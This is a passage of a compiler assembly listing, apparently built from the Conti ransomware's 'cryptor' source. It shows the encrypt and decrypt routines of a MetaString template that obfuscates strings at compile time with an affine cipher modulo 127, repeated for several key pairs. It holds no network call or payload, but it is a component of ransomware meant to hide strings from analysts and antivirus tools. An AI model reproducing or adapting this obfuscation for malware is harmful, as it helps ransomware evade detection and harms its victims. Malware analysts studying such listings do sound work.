  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 16	 add	 r8d, 22
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 6f	 sub	 eax, 111		; 0000006fH
  00006	44 6b c0 1c	 imul	 r8d, eax, 28

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3b	 imul	 r8d, eax, 59		; 0000003bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 6f	 add	 r8d, 111		; 0000006fH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<59,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<59,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 66 00 00 00	 mov	 ecx, 102		; 00000066H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 66	 add	 r8d, 102		; 00000066H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<29,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 4f 00 00 00	 mov	 ecx, 79			; 0000004fH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 3f	 imul	 r8d, ecx, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<2,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 04 45 4f
	00 00 00	 lea	 r8d, DWORD PTR [rax*2+79]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<2,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<2,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<2,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 c2	 imul	 r8d, eax, -62		; ffffffffffffffc2H

; 40   :     return (a % n + n) % n;

  00007	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000c	41 f7 e8	 imul	 r8d
  0000f	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00014	41 03 d0	 add	 edx, r8d
  00017	c1 fa 06	 sar	 edx, 6
  0001a	8b ca		 mov	 ecx, edx
  0001c	c1 e9 1f	 shr	 ecx, 31
  0001f	03 d1		 add	 edx, ecx
  00021	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00024	44 2b c1	 sub	 r8d, ecx
  00027	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002b	41 f7 e8	 imul	 r8d
  0002e	41 03 d0	 add	 edx, r8d
  00031	c1 fa 06	 sar	 edx, 6
  00034	8b ca		 mov	 ecx, edx
  00036	c1 e9 1f	 shr	 ecx, 31
  00039	03 d1		 add	 edx, ecx
  0003b	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0003e	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00041	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<43,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 2b	 imul	 r8d, eax, 43		; 0000002bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 f7 e0	 mul	 r8d
  0000f	41 8b c8	 mov	 ecx, r8d
  00012	2b ca		 sub	 ecx, edx
  00014	d1 e9		 shr	 ecx, 1
  00016	03 ca		 add	 ecx, edx
  00018	c1 e9 06	 shr	 ecx, 6
  0001b	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  0001e	44 2b c1	 sub	 r8d, ecx
  00021	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00025	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<43,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<43,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<43,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 4b	 sub	 eax, 75			; 0000004bH
  00006	44 6b c0 37	 imul	 r8d, eax, 55		; 00000037H

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 4b	 add	 r8d, 75			; 0000004bH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
